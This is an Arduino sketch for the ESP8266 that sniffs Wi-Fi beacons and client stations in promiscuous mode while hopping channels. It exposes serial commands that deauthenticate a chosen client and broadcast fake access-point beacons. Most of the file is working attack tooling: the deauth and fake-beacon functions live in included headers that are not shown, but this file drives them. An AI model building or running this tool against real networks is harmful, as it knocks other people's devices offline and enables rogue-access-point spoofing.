/*
   By Gordon Pimblott Sept 2018 on Arduino 1.8.6

   Distributed under the MIT license (URL)

   Based on lots of other great projects
    * Lars Juhl Jensen 20170415 compiled on OS X using Arduino 1.8.2
    * Ray Burnette's ESP8266 Mini Sniff (MIT) https://www.hackster.io/rayburne/esp8266-mini-sniff-f6b93a
    * RandDruid/esp8266-deauth (MIT) https://github.com/RandDruid/esp8266-deauth
*/

#include <ESP8266WiFi.h>

#include "esp_functions.h"
#include "structures.h"
#include "deauth.h"
#include "beacons.h"
#include "clients.h"


uint8_t channel = 1;
uint8_t nothing_new = 0;

Beacons beacons;
Clients clients;

/*
 *  Function that prints all beacons and clients in JSON format
 */
void print_all() {
  Serial.print("{\"beacons\":");
  beacons.print();
  Serial.print(",\"clients\":");
  clients.print();
  Serial.print("}");
}


/*
 *  Callback function for promiscuous mode that parses received packet
 */
void parse_packet(uint8_t *buf, uint16_t len) {
  int i = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf1 *sniffer = (struct sniffer_buf1*) buf;
    struct beaconinfo bi = beacons.parse(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (bi.err == 0 && beacons.store(bi) == 0) nothing_new = 0;
  } else {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = clients.parse(sniffer->buf, 36, sniffer->rx_ctrl.rssi);
      if (memcmp(ci.beacon, ci.station, ETH_MAC_LEN)) {
        if (ci.err == 0 && clients.store(ci) == 0) nothing_new = 0;
      }
    }
  }
}


/*
 * Function that reads and executes a command from serial
 */
void read_command() {
  char command[64];
  command[Serial.readBytesUntil('\n', command, 63)] = '\0';
  char *argument = strchr(command, ' ');
  if (argument != NULL) {
    *argument = '\0';
    argument++;
  }
  if (strcmp(command, "deauth_client") == 0) {
    uint8_t station[ETH_MAC_LEN];
    for (int i = 0; i < ETH_MAC_LEN; i++) {
      station[i] = strtol(argument + 3 * i, NULL, HEX);
    }

    clientinfo *ci = clients.find( station );
    if( ci ) {
      deauth_client( *ci );
    }

  }
  else if (strcmp(command, "fake_beacon") == 0) {
    char *argument_ssid;
    uint8_t argument_channel = strtol(argument, &argument_ssid, DEC);
    if (argument_ssid != argument) {
      if (*argument_ssid != '\0') argument_ssid++;
      beacons.addFake( argument_channel , argument_ssid );
      Serial.printf("Adding fake beacon: %d %s\n" , argument_channel , argument_ssid);
    }
  }
  else if (strcmp(command, "print_all") == 0) {
    print_all();
  }
  else if (strcmp(command, "print_beacons") == 0) {
    beacons.print();
  }
  else if (strcmp(command, "print_clients") == 0) {
    clients.print();
  }
  Serial.println("\n");
}


/*
 *  Initial setup
 */
void setup() {
  Serial.begin(115200);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channel);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(parse_packet);
  wifi_promiscuous_enable(1);
}


/*
 * Main loop
 */
void loop() {
  if (nothing_new >= 10) {
    nothing_new = 0;
    channel++;
    if (channel == 15) channel = 1;
    wifi_set_channel(channel);
  }
  else {
    nothing_new++;
  }
  
  beacons.sendFake(3, channel);
  
  delay(1);
  
  if (Serial.available() > 0) {
    read_command();
  }
}
